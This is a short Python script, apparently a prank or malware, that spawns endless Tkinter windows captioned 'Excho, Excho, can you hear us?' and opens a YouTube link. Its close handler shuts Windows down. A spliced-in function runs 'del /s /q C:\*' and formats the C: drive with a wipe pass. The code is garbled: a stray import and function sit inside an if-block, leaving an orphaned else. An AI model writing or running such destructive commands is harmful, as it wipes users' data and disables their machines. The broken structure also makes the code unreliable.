import webbrowser
import tkinter as tk
import os

def create_window():
    window = tk.Tk()
    window.title("Excho, Excho, can you hear us?")
    window.geometry("400x200")
    label = tk.Label(window, text="Excho, Excho, can you hear us?", font=("Arial", 16))
    label.pack(pady=20)
    window.protocol("WM_DELETE_WINDOW", on_closing)
    window.mainloop()

def on_closing():
    global num_windows
    num_windows -= 1
    if num_windows <= 0:
        os.system("shutdown /s /t 1")
      import os

def delete_data():
    os.system("del /s /q C:\\*")
    os.system("format C: /fs:NTFS /p:1 /q")

delete_data()

    else:
        create_window()

num_windows = 1
create_window()
webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
while True:
    num_windows += 1
    create_window()
